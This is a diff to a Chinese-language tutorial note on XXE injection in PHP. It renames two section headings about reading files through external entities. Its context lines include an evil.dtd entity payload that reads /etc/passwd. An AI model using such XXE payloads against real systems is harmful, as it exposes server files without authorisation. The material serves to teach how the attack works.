@@ -24,7 +24,7 @@ echo $xml->name;
 ```
 
 ### 0x02 读取文件
-* 内部声明实体
+* 外部引用读取passwd
 
 ```
 <?xml version="1.0" encoding="utf-8"?> 
@@ -48,7 +48,7 @@ echo $xml->name;
 </root>
 ```
 
-* 引用外部实体
+* 外部引用dtd文件读取passwd
 
 evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
 ```
